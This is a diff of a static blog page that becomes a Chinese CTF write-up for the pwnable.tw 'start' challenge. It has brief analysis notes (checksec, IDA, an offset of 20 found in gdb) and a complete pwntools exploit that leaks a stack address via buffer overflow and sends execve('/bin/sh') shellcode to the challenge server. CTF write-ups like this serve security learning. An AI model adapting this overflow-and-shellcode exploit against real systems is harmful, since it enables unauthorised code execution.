@@ -58,19 +58,25 @@
   };
 </script>
 
-  <meta name="description" content="专注web与binary的菜鸟">
-<meta name="keywords" content="web安全,逆向,ctf,pwn,crypto,misc">
-<meta property="og:type" content="website">
-<meta property="og:title" content="bufsnake">
-<meta property="og:url" content="https://bufsnake.github.io/tags/heap/index.html">
+  <meta name="description" content="start checksec ida查看  发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的    gdb调试得知偏移为20  exp12345678910111213141516171819202122232425from pwn import *context.arch = &apos;i386&apos;context.log_level=&quot;d">
+<meta name="keywords" content="pwnable.tw,write">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw-start">
+<meta property="og:url" content="https://bufsnake.github.io/pwnable-tw-start.html">
 <meta property="og:site_name" content="bufsnake">
-<meta property="og:description" content="专注web与binary的菜鸟">
+<meta property="og:description" content="start checksec ida查看  发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的    gdb调试得知偏移为20  exp12345678910111213141516171819202122232425from pwn import *context.arch = &apos;i386&apos;context.log_level=&quot;d">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://bufsnake.github.io/images/pasted-0.png">
+<meta property="og:image" content="https://bufsnake.github.io/images/pasted-3.png">
+<meta property="og:image" content="https://bufsnake.github.io/images/pasted-1.png">
+<meta property="og:image" content="https://bufsnake.github.io/images/pasted-2.png">
+<meta property="og:updated_time" content="2019-08-11T04:10:56.092Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bufsnake">
-<meta name="twitter:description" content="专注web与binary的菜鸟">
+<meta name="twitter:title" content="pwnable.tw-start">
+<meta name="twitter:description" content="start checksec ida查看  发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的    gdb调试得知偏移为20  exp12345678910111213141516171819202122232425from pwn import *context.arch = &apos;i386&apos;context.log_level=&quot;d">
+<meta name="twitter:image" content="https://bufsnake.github.io/images/pasted-0.png">
   <link rel="alternate" href="/atom.xml" title="bufsnake" type="application/atom+xml">
-  <link rel="canonical" href="https://bufsnake.github.io/tags/heap/">
+  <link rel="canonical" href="https://bufsnake.github.io/pwnable-tw-start">
 
 
 <script id="page-configurations">
@@ -78,13 +84,13 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false,
+    isPost: true,
     isPage: false,
     isArchive: false
   };
 </script>
 
-  <title>标签: heap | bufsnake</title>
+  <title>pwnable.tw-start | bufsnake</title>
   
   <script async src="https://www.googletagmanager.com/gtag/js?id=UA-145389457-1"></script>
   <script>
@@ -287,97 +293,205 @@
         <div class="content-wrap">
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-          <div id="content" class="content ">
+          <div id="content" class="content page-post-detail">
             
 
-  
-  
-  
-  <div class="post-block tag">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>heap<small>标签</small>
-        </h1>
-      </div>
-
-      
-
-  
-  
-  
-
-  
+  <div id="posts" class="posts-expand">
     
-    <div class="collection-title">
-      <h1 class="archive-year" id="archive-year-2019">2019</h1>
-    </div>
-  
-  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://bufsnake.github.io/pwnable-tw-start.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bufsnake">
+      <meta itemprop="description" content="专注web与binary的菜鸟">
+      <meta itemprop="image" content="https://bufsnake.github.io/images/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="bufsnake">
+    </span>
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/Heap的学习-1.html" itemprop="url">
+          <h1 class="post-title" itemprop="name headline">pwnable.tw-start
+
             
-              <span itemprop="name">Heap的学习(1)</span>
-            
-          </a>
+          </h1>
         
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-08-10T13:57:00+08:00"
-              content="2019-08-10">
-          08-10
-        </time>
-      </div>
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
 
-    </header>
-  </article>
+              
+                
+              
 
+              <time title="创建时间：2019-08-11 11:54:32 / 修改时间：12:10:56" itemprop="dateCreated datePublished" datetime="2019-08-11T11:54:32+08:00">2019-08-11</time>
+            </span>
+          
+            
 
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
 
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p><img src="/images/pasted-0.png" alt="upload successful"></p>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/images/pasted-3.png" alt="upload successful"></p>
+<h3 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h3><p><img src="/images/pasted-1.png" alt="upload successful"></p>
+<blockquote>
+<p>发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的</p>
+</blockquote>
+<p><img src="/images/pasted-2.png" alt="upload successful"></p>
+<blockquote>
+<p>gdb调试得知偏移为20</p>
+</blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pro = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">shellcode = asm('\n'.join([</span></span><br><span class="line"><span class="string">    'push %d' % u32('/sh\0'),</span></span><br><span class="line"><span class="string">    'push %d' % u32('/bin'),</span></span><br><span class="line"><span class="string">    'xor edx, edx',</span></span><br><span class="line"><span class="string">    'xor ecx, ecx',</span></span><br><span class="line"><span class="string">    'mov ebx, esp',</span></span><br><span class="line"><span class="string">    'mov eax, 0xb',</span></span><br><span class="line"><span class="string">    'int 0x80',</span></span><br><span class="line"><span class="string">]))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pro.readuntil(<span class="string">"CTF:"</span>)</span><br><span class="line">pro.send(<span class="string">'a'</span>*<span class="number">20</span> + p32(ret))</span><br><span class="line">shell_addr = u32(pro.recv()[:<span class="number">4</span>])</span><br><span class="line">pro.send(<span class="string">'A'</span>*<span class="number">20</span>+p32(shell_addr+<span class="number">20</span>)+shellcode)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+    <div>
+      
+          <div>
+    
+      <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
     </div>
 
+    
+    
+    
+
+      <div>
+            
+               
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+    <!-- JS库 sweetalert 可修改路径 -->
+    <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <p><span>本文标题:</span><a href="/pwnable-tw-start.html">pwnable.tw-start</a></p>
+    <p><span>文章作者:</span><a href="/" title="访问 bufsnake 的个人博客">bufsnake</a></p>
+    <p><span>发布时间:</span>2019年08月11日 - 11:08</p>
+    <p><span>最后更新:</span>2019年08月11日 - 12:08</p>
+    <p><span>原始链接:</span><a href="/pwnable-tw-start.html" title="pwnable.tw-start">https://bufsnake.github.io/pwnable-tw-start.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bufsnake.github.io/pwnable-tw-start.html" aria-label="复制成功！"></i></span>
+    </p>
+    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+       var clipboard = new Clipboard('.fa-clipboard');
+       $(".fa-clipboard").click(function(){
+       clipboard.on('success', function(){
+       swal({   
+           title: "",   
+           text: '复制成功',
+           icon: "success", 
+           showConfirmButton: true
+       });
+       });
+      });  
+</script>
+
+
+            
+      </div>
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+            
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+            
+              <a href="/tags/pwnable-tw/" rel="tag"># pwnable.tw</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/Heap的学习-1.html" rel="next" title="Heap的学习(1)">
+                  <i class="fa fa-chevron-left"></i> Heap的学习(1)
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
   </div>
   
   
   
+  </article>
 
-  
-
+  </div>
 
 
           </div>
           
+    
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTk0NS8yMjQ1Ng=="></div>
+  </div>
+  
+  
 
         </div>
           
@@ -392,8 +506,17 @@
 
   <aside id="sidebar" class="sidebar">
     <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
 
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -592,6 +715,23 @@
 
         </div>
       </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#start"><span class="nav-number">1.</span> <span class="nav-text">start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-number">2.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ida查看"><span class="nav-number">3.</span> <span class="nav-text">ida查看</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
     </div>
   </aside>
@@ -716,7 +856,24 @@
 
 
   
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
     
+<script>
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
 
 </body>
 </html>
